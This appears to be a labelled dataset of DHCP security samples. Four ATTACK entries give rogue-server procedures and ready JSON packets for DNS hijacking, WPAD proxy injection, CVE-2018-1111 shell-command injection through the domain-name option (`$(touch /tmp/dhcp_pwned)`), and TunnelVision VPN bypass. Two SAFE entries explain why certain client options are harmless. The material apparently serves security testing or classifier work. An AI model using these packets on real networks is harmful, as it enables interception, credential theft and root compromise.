## 1) DHCPOFFER - Option-6-Domain-Name-Server
**Message:** DHCPOFFER (DO)
**Target Option's path:** Option-6-Domain-Name-Server
**Threat Model:**
- **Attack Assumption:**
In the target enterprise network, client hosts obtain their IPv4 configuration via DHCP from a legitimate DHCP server (ISC DHCP dhcpd 4.4+, Kea DHCP, or dnsmasq) on a shared Layer-2 broadcast domain.
We assume: (i) the attacker's host is connected to the same Layer-2 segment (VLAN) as the victim and can receive DHCP broadcast traffic (DHCPDISCOVER messages are broadcast per RFC 2131 Section 4.1); (ii) no DHCP snooping (RFC 7513) is deployed on the access switches — a prerequisite documented in RFC 7819 "DHCP Threat Analysis" (Jiang et al., 2016), Section 4, which notes that "an unauthorized DHCP server [...] may be set up by an attacker to provide incorrect configuration information to the client"; (iii) the attacker's rogue DHCP server can respond to DHCPDISCOVER before the legitimate server (race condition exploitable in practice, as the attacker and victim share the same L2 segment — empirically demonstrated in penetration testing frameworks such as Ettercap and Bettercap); (iv) the victim DHCP client writes the server-provided DNS addresses to the system resolver configuration (e.g., `/etc/resolv.conf` on Linux, or via systemd-resolved) without additional validation.
- **Attacker Capability:**
The attacker is restricted to only send one DHCP message and passively receive a corresponding response.

**Attack Procedure:**
The attacker operates a rogue DHCP server that listens for DHCPDISCOVER broadcasts on UDP port 67. Upon receiving a DHCPDISCOVER from a victim (chaddr=aa:bb:cc:dd:ee:ff, xid=0x1A2B3C4D), the attacker crafts an Attack Message DHCPOFFER (op=2, BOOTREPLY). The DHCP header sets yiaddr=192.168.1.50 (a plausible IP from the subnet), siaddr=192.168.1.200 (attacker's IP). The critical manipulation is Option 6 (Domain Name Server, RFC 2132 Section 3.8): instead of providing the legitimate DNS server (e.g., 192.168.1.1), the attacker sets Option 6 to 192.168.1.200 — the attacker's own host, which runs a malicious DNS resolver (e.g., dnsmasq or CoreDNS configured to return attacker-controlled A/AAAA records for targeted domains while proxying other queries to upstream). Additional options include Option 53 (Message Type=2), Option 54 (Server Identifier=192.168.1.200), Option 51 (Lease Time=3600), Option 1 (Subnet Mask=255.255.255.0), and Option 3 (Router=192.168.1.1, using the legitimate gateway to avoid network disruption and reduce detection).

After the victim completes the DORA handshake, its resolver configuration points to 192.168.1.200. All subsequent DNS queries from the victim are processed by the attacker's DNS server. The attacker can selectively poison responses for targeted domains (e.g., returning the attacker's IP for "login.corp.example.com") while forwarding all other queries to a legitimate upstream DNS server, making the attack stealthy. This enables targeted phishing (redirecting corporate login pages to credential-harvesting clones), malware delivery (redirecting software update domains), and session hijacking. Unlike traditional DNS cache poisoning (which targets the resolver), this attack provides persistent, complete control over the victim's DNS resolution for the entire lease duration. The PoC is successful if the victim's resolver configuration shows the attacker's DNS server (verifiable via `cat /etc/resolv.conf` on Linux or `ipconfig /all` on Windows) and DNS queries from the victim arrive at the attacker's DNS server (verifiable via packet capture or DNS query logs on the attacker's host).

**Attack Message:**
The following is the attack packet represented in a fixed JSON structure. This packet can be used to verify the PoC in a real environment.

{
  "dhcp_header": {
    "op": 2,
    "htype": 1,
    "hlen": 6,
    "hops": 0,
    "xid": "0x1A2B3C4D",
    "secs": 0,
    "flags": "0x0000",
    "ciaddr": "0.0.0.0",
    "yiaddr": "192.168.1.50",
    "siaddr": "192.168.1.200",
    "giaddr": "0.0.0.0",
    "chaddr": "aa:bb:cc:dd:ee:ff"
  },
  "options": [
    {"code": 53, "name": "DHCP Message Type", "value": 2},
    {"code": 54, "name": "Server Identifier", "value": "192.168.1.200"},
    {"code": 51, "name": "IP Address Lease Time", "value": 3600},
    {"code": 1, "name": "Subnet Mask", "value": "255.255.255.0"},
    {"code": 3, "name": "Router", "value": "192.168.1.1"},
    {"code": 6, "name": "Domain Name Server", "value": "192.168.1.200"},
    {"code": 255, "name": "End"}
  ]
}

**Classification:**
ATTACK


## 2) DHCPOFFER - Option-252-WPAD-URL
**Message:** DHCPOFFER (DO)
**Target Option's path:** Option-252-WPAD-URL
**Threat Model:**
- **Attack Assumption:**
In the target network, client hosts (running Windows 10/11 or browsers configured for automatic proxy detection) obtain network configuration via DHCP. The clients support Web Proxy Auto-Discovery (WPAD), a mechanism by which the network can automatically configure HTTP proxy settings on client browsers.
We assume: (i) the attacker is on the same Layer-2 segment as the victim and operates a rogue DHCP server (same L2/no DHCP snooping assumption as sample #1); (ii) the victim's operating system or browser has automatic proxy detection enabled — on Windows, this is controlled by "Automatically detect settings" in Internet Options, which is enabled by default (ref: Microsoft documentation "Automatic Detection/Configuration Concepts", MS-WPAD); (iii) the DHCP server can deliver Option 252 (WPAD URL), a de facto standard option widely supported by ISC DHCP, Kea, and dnsmasq (configurable via `option wpad-url` or `option 252`); (iv) the victim's WPAD client (Windows WinHTTP, Internet Explorer, or compatible browsers) fetches and executes the Proxy Auto-Config (PAC) file from the URL provided in Option 252 without user confirmation; and (v) WPAD has been the subject of multiple security advisories, including Microsoft's MS16-077 (June 2016) which patched authentication-related WPAD vulnerabilities, and the "BadTunnel" attack (CVE-2016-3213, presented at Black Hat USA 2016 by Yang Yu) which exploited WPAD for cross-network-boundary attacks.
- **Attacker Capability:**
The attacker is restricted to only send one DHCP message and passively receive a corresponding response.

**Attack Procedure:**
The attacker runs a rogue DHCP server and a minimal HTTP server on 192.168.1.200. The HTTP server hosts a malicious PAC file at `http://192.168.1.200/wpad.dat` with content: `function FindProxyForURL(url, host) { return "PROXY 192.168.1.200:8080"; }`. Upon receiving a victim's DHCPDISCOVER, the attacker crafts an Attack Message DHCPOFFER (op=2). The critical manipulation is Option 252 (WPAD URL): the attacker sets its value to `http://192.168.1.200/wpad.dat`. Other options are configured normally (legitimate gateway in Option 3, legitimate DNS in Option 6) to avoid triggering network-level alerts.

After the victim processes the DHCPACK, the WPAD client (WinHTTP on Windows, or curl/Firefox if configured for auto-proxy) detects Option 252, fetches the PAC file from the attacker's HTTP server, and configures the browser/system to route all HTTP and HTTPS traffic through the attacker's proxy at 192.168.1.200:8080. The attacker's proxy (e.g., mitmproxy, Squid) can then: (a) log all HTTP requests and capture credentials submitted over unencrypted connections; (b) perform TLS interception (if the victim's trust store is compromised or the user ignores certificate warnings); (c) inject malicious content into HTTP responses; (d) selectively redirect traffic to phishing pages. Unlike Option-3 (Router) gateway hijacking, WPAD proxy injection operates at the application layer and specifically targets HTTP/HTTPS traffic, making it effective even when the victim's default gateway is correct. The PoC is successful if the victim's browser routes HTTP requests through the attacker's proxy (verifiable via `curl --verbose http://example.com` showing the proxy connection, or by observing request logs on the attacker's mitmproxy instance).

**Attack Message:**
The following is the attack packet represented in a fixed JSON structure. This packet can be used to verify the PoC in a real environment.

{
  "dhcp_header": {
    "op": 2,
    "htype": 1,
    "hlen": 6,
    "hops": 0,
    "xid": "0x2B3C4D5E",
    "secs": 0,
    "flags": "0x0000",
    "ciaddr": "0.0.0.0",
    "yiaddr": "192.168.1.50",
    "siaddr": "192.168.1.200",
    "giaddr": "0.0.0.0",
    "chaddr": "aa:bb:cc:dd:ee:ff"
  },
  "options": [
    {"code": 53, "name": "DHCP Message Type", "value": 2},
    {"code": 54, "name": "Server Identifier", "value": "192.168.1.200"},
    {"code": 51, "name": "IP Address Lease Time", "value": 3600},
    {"code": 1, "name": "Subnet Mask", "value": "255.255.255.0"},
    {"code": 3, "name": "Router", "value": "192.168.1.1"},
    {"code": 6, "name": "Domain Name Server", "value": "192.168.1.1"},
    {"code": 252, "name": "WPAD URL", "value": "http://192.168.1.200/wpad.dat"},
    {"code": 255, "name": "End"}
  ]
}

**Classification:**
ATTACK


## 3) DHCPOFFER - Option-15-Domain-Name
**Message:** DHCPOFFER (DO)
**Target Option's path:** Option-15-Domain-Name
**Threat Model:**
- **Attack Assumption:**
In the target network, client hosts running Red Hat Enterprise Linux (RHEL 6/7), CentOS 6/7, or derived distributions obtain their network configuration via DHCP using the ISC dhclient DHCP client integrated with NetworkManager.
We assume: (i) the attacker is on the same Layer-2 segment as the victim and operates a rogue DHCP server (same L2/no DHCP snooping assumption as sample #1); (ii) the victim system runs NetworkManager with dhclient as the DHCP backend (the default on RHEL/CentOS); (iii) NetworkManager's DHCP dispatcher mechanism passes DHCP option values received from the server as environment variables to scripts in `/etc/NetworkManager/dispatcher.d/` — this is standard, documented NetworkManager behavior for integrating DHCP-provided configuration with system services; (iv) at least one dispatcher script processes these environment variables without adequate sanitization of shell metacharacters — this was the root cause of CVE-2018-1111 ("DynoRoot"), a command injection vulnerability in the RHEL/CentOS NetworkManager DHCP client integration script, assigned CVSS v3 base score 7.5 (HIGH) by Red Hat, affecting RHEL 6 and 7 and all derived distributions; and (v) the victim has not applied the patch for CVE-2018-1111 (Red Hat advisory RHSA-2018:1453, May 2018), or a similar unsanitized dispatcher script exists from custom or third-party configuration.
- **Attacker Capability:**
The attacker is restricted to only send one DHCP message and passively receive a corresponding response.

**Attack Procedure:**
The attacker operates a rogue DHCP server. Upon receiving a victim's DHCPDISCOVER, the attacker crafts an Attack Message DHCPOFFER (op=2) with standard network parameters (legitimate gateway, DNS, subnet). The critical manipulation is Option 15 (Domain Name, RFC 2132 Section 3.17): instead of a legitimate domain string like "corp.example.com", the attacker sets the value to a string containing shell metacharacters. Following the CVE-2018-1111 attack pattern, the payload is crafted to exploit unsanitized variable expansion in the dispatcher script: for example, the domain-name value `example.com$(touch /tmp/dhcp_pwned)` or the more evasive `x]&"/bin/touch /tmp/dhcp_pwned"&[x`. When dhclient processes the DHCP response, it stores the domain-name option value and passes it to NetworkManager, which sets it as the `DHCP4_DOMAIN_NAME` environment variable and invokes dispatcher scripts.

If any dispatcher script uses `$DHCP4_DOMAIN_NAME` (or the legacy dhclient variable `new_domain_name`) in a shell command without proper quoting (e.g., `echo $new_domain_name >> /some/config`), the injected command executes with the privileges of the NetworkManager dispatcher (typically root). In the CVE-2018-1111 scenario, the vulnerable script was `/etc/NetworkManager/dispatcher.d/11-dhclient`, which used dhclient-provided values in unquoted shell expansions. Successful exploitation achieves arbitrary command execution as root on the victim host from a single DHCP response. The PoC is successful if the injected command executes (verifiable by checking for the file `/tmp/dhcp_pwned` on the victim, or by receiving a reverse shell connection on the attacker's listener). This attack demonstrates a critical class of vulnerability: DHCP option values flowing unsanitized from the network into local shell command execution, a pattern that can recur in any system that processes DHCP options via shell scripts (custom dispatch scripts, cloud-init integrations, network configuration automation tools).

**Attack Message:**
The following is the attack packet represented in a fixed JSON structure. This packet can be used to verify the PoC in a real environment.

{
  "dhcp_header": {
    "op": 2,
    "htype": 1,
    "hlen": 6,
    "hops": 0,
    "xid": "0x3C4D5E6F",
    "secs": 0,
    "flags": "0x0000",
    "ciaddr": "0.0.0.0",
    "yiaddr": "192.168.1.50",
    "siaddr": "192.168.1.200",
    "giaddr": "0.0.0.0",
    "chaddr": "aa:bb:cc:dd:ee:ff"
  },
  "options": [
    {"code": 53, "name": "DHCP Message Type", "value": 2},
    {"code": 54, "name": "Server Identifier", "value": "192.168.1.200"},
    {"code": 51, "name": "IP Address Lease Time", "value": 3600},
    {"code": 1, "name": "Subnet Mask", "value": "255.255.255.0"},
    {"code": 3, "name": "Router", "value": "192.168.1.1"},
    {"code": 6, "name": "Domain Name Server", "value": "192.168.1.1"},
    {"code": 15, "name": "Domain Name", "value": "example.com$(touch /tmp/dhcp_pwned)"},
    {"code": 255, "name": "End"}
  ]
}

**Classification:**
ATTACK


## 4) DHCPOFFER - Option-121-Classless-Static-Routes
**Message:** DHCPOFFER (DO)
**Target Option's path:** Option-121-Classless-Static-Routes
**Threat Model:**
- **Attack Assumption:**
In the target network, client hosts (running Windows 10/11, macOS, or Linux with NetworkManager/systemd-networkd) obtain their network configuration via DHCP. At least one client uses a routing-based VPN solution (e.g., OpenVPN, WireGuard, Cisco AnyConnect, or GlobalProtect) that creates a tunnel interface and adds routes to direct traffic through the VPN.
We assume: (i) the attacker is on the same Layer-2 segment as the victim and operates a rogue DHCP server (same L2/no DHCP snooping assumption as sample #1); (ii) the victim's DHCP client supports and processes Option 121 (Classless Static Route Option, RFC 3442) — virtually all modern operating systems do: Windows since XP/Server 2003, macOS since 10.6, Linux dhclient/NetworkManager by default; (iii) the victim's DHCP client applies Option 121 routes with higher priority than the default route from Option 3 (Router), as mandated by RFC 3442 Section 7: "If the DHCP server returns both a Classless Static Routes option and a Router option, the DHCP client MUST ignore the Router option"; (iv) the victim's VPN client uses routing table entries (rather than firewall rules or network namespace isolation) to direct traffic through the VPN tunnel — the predominant implementation approach; and (v) the VPN tunnel remains established and the VPN client does not detect or prevent routing table modification by DHCP-learned routes. This attack was publicly disclosed as "TunnelVision" by Levin and Meltzer of Leviathan Security Group in May 2024, assigned CVE-2024-3661.
- **Attacker Capability:**
The attacker is restricted to only send one DHCP message and passively receive a corresponding response.

**Attack Procedure:**
The attacker operates a rogue DHCP server that races the legitimate server. Upon receiving a DHCPDISCOVER from the victim, the attacker crafts an Attack Message DHCPOFFER (op=2) with yiaddr=192.168.1.50, siaddr=192.168.1.200 (attacker). The critical manipulation is Option 121 (Classless Static Routes, RFC 3442): the attacker includes two /1 routes that together cover the entire IPv4 address space — 0.0.0.0/1 via 192.168.1.200 and 128.0.0.0/1 via 192.168.1.200. Per RFC 3442 Section 7, the DHCP client MUST install these classless routes and MUST ignore the Router option (Option 3). Because these /1 routes are more specific than the VPN's default route (0.0.0.0/0), the kernel's longest-prefix-match routing algorithm selects the DHCP-learned /1 routes over the VPN tunnel route for all destinations. The only exception is the VPN server's own IP, which typically has a /32 host route through the physical gateway. Option 3 is included (pointing to the legitimate gateway 192.168.1.1) for compatibility, though it will be ignored per RFC 3442. Option 6 provides attacker-controlled DNS (192.168.1.200) for additional control.

After the victim processes the DHCPACK and installs the routes, all IP traffic — including traffic that the VPN was supposed to protect — is routed through the attacker's gateway (192.168.1.200) instead of the VPN tunnel interface. Critically, the VPN tunnel itself remains established (it uses a /32 host route to the VPN server that is not overridden), so the VPN client reports "connected" status and the victim has no indication of leakage. The attacker can passively capture the decloaked traffic or perform active man-in-the-middle attacks. CVE-2024-3661 affects all major operating systems and VPN implementations that rely on routing rather than network namespace isolation. The PoC is successful if the victim's routing table shows two /1 routes via 192.168.1.200 (verifiable via `ip route show` or `netstat -rn`) while the VPN tunnel remains up, and traffic capture on the attacker's interface shows the victim's traffic transiting outside the VPN tunnel.

**Attack Message:**
The following is the attack packet represented in a fixed JSON structure. This packet can be used to verify the PoC in a real environment.

{
  "dhcp_header": {
    "op": 2,
    "htype": 1,
    "hlen": 6,
    "hops": 0,
    "xid": "0xCAFE0001",
    "secs": 0,
    "flags": "0x0000",
    "ciaddr": "0.0.0.0",
    "yiaddr": "192.168.1.50",
    "siaddr": "192.168.1.200",
    "giaddr": "0.0.0.0",
    "chaddr": "aa:bb:cc:dd:ee:ff"
  },
  "options": [
    {"code": 53, "name": "DHCP Message Type", "value": 2},
    {"code": 54, "name": "Server Identifier", "value": "192.168.1.200"},
    {"code": 51, "name": "IP Address Lease Time", "value": 3600},
    {"code": 1, "name": "Subnet Mask", "value": "255.255.255.0"},
    {"code": 3, "name": "Router", "value": "192.168.1.1"},
    {"code": 6, "name": "Domain Name Server", "value": "192.168.1.200"},
    {"code": 121, "name": "Classless Static Routes", "value": [
      {"destination": "0.0.0.0/1", "next_hop": "192.168.1.200"},
      {"destination": "128.0.0.0/1", "next_hop": "192.168.1.200"}
    ]},
    {"code": 255, "name": "End"}
  ]
}

**Classification:**
ATTACK


## 5) DHCPDISCOVER - Option-55-Parameter-Request-List
**Message:** DHCPDISCOVER (DD)
**Target Option's path:** Option-55-Parameter-Request-List
**Threat Model:**
- **Attack Assumption:**
In the target network, a DHCP server manages IPv4 address allocation for client hosts. A client device sends a DHCPDISCOVER to obtain its network configuration.
We assume: (i) the DHCP server's UDP port 67 is reachable from the client's network segment; (ii) the server processes DHCPDISCOVER messages per RFC 2131 Section 3.1; and (iii) the client is performing a standard DHCP address acquisition.
- **Attacker Capability:**
The attacker is restricted to only send one DHCP message and passively receive a corresponding response.
**Security Analysis:**
Option 55 (Parameter Request List, RFC 2132 Section 9.8) is a variable-length list of DHCP option codes that the client includes in DHCPDISCOVER and DHCPREQUEST messages to indicate which configuration parameters it would like to receive from the server. The server uses this list as an advisory hint when constructing its response — it MAY include the requested options if available, and MAY include additional options not requested (RFC 2132 Section 9.8: "The client MAY list the options in order of preference"). Manipulating the Parameter Request List has the following bounded effects: (a) if the client requests options the server does not support, the server simply omits them — no error or state change occurs; (b) if the client requests sensitive options (e.g., Option 82 - Relay Agent Information), the server does not include internal relay information in responses to clients per RFC 3046 Section 2.1; (c) if the client omits commonly requested options (e.g., does not request Option 3/Router), the server may still include them or may omit them, affecting only this client's own configuration; (d) requesting a very large number of options in the list does not cause resource exhaustion because the response is bounded by the maximum DHCP message size (typically 576 bytes for BOOTP compatibility, or up to the value advertised in Option 57). In all cases, the Parameter Request List is a read-only declaration of interest that affects only the contents of the response sent back to the requesting client. It cannot modify server state, other clients' leases, the address pool, or any persistent configuration.

**Classification:**
SAFE


## 6) DHCPREQUEST - Option-12-Host-Name
**Message:** DHCPREQUEST (DR)
**Target Option's path:** Option-12-Host-Name
**Threat Model:**
- **Attack Assumption:**
In the target network, a DHCP server manages address allocation and a client sends DHCPREQUEST during the standard DORA handshake to confirm its address assignment. The client includes Option 12 (Host Name) in the request.
We assume: (i) the DHCP server's UDP port 67 is reachable from the client's network segment; (ii) the server processes DHCPREQUEST messages per RFC 2131 Section 4.3; (iii) the DHCP server does NOT perform DHCP-DNS dynamic updates (DDNS, RFC 4702) — i.e., the server does not automatically register the client's hostname in DNS; and (iv) the client is performing standard address confirmation.
- **Attacker Capability:**
The attacker is restricted to only send one DHCP message and passively receive a corresponding response.
**Security Analysis:**
Option 12 (Host Name, RFC 2132 Section 3.14) allows the client to communicate its hostname to the DHCP server. When included in a DHCPREQUEST (client-to-server direction), it serves an informational purpose: the server may log the hostname for administrative tracking, display it in lease tables (e.g., in ISC DHCP's `dhcpd.leases` file or Kea's lease database), or use it for network management dashboards. Manipulating the Host Name option in a single DHCPREQUEST has the following limited effects: (a) the server records the provided hostname alongside the lease — this is a cosmetic/administrative change that does not affect network routing, address allocation, or other clients' configurations; (b) if the hostname contains unusual characters, well-implemented DHCP servers sanitize or truncate it (ISC DHCP limits the hostname per RFC 952 conventions); (c) without DDNS enabled (our assumption), the hostname is NOT propagated to any DNS zone, so it cannot be used for DNS poisoning or hostname hijacking; (d) even if DDNS were enabled, a single hostname update for the client's own leased IP is expected behavior — the client is declaring its own name for its own address. The Host Name option in the client-to-server direction does not modify server configuration, affect other clients' leases, alter the address pool, or change routing. It is purely an informational declaration bounded to the requesting client's own lease record. (Note: this analysis applies to Option 12 in the client-to-server direction; server-to-client delivery of Option 12 has a different security profile — see CVE-2018-1111 for command injection risks when server-provided option values flow into client-side shell scripts.)

**Classification:**
SAFE
